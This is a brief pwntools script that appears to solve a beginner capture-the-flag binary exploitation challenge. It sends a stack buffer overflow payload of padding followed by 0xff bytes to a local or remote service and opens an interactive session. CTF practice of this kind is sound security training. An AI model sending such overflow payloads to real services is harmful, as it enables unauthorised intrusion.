from pwn import *

HOST = args.HOST or 'localhost'
PORT = args.PORT or 31199

if args.LOCAL:
  p = process("./bin/beginner-generic-pwn-number-0")
else:
  p = remote(HOST, PORT)

p.sendline("A" * (32 + 8) + "\xff" * 8)

p.interactive()
